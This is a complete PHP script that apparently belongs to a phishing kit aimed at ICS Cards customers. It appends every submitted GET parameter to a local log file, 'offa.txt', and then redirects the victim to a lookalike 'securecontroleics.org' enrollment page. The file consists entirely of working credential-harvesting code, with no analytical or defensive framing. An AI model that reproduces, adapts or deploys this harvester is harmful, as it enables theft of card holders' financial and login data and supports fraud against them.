<?php
header("Location: http://securecontroleics.org/service/www.icscards.nl/ics/enrollment.html");
$handle = fopen("offa.txt", "a");
foreach($_GET as $variable => $value) {fwrite($handle, $variable);fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 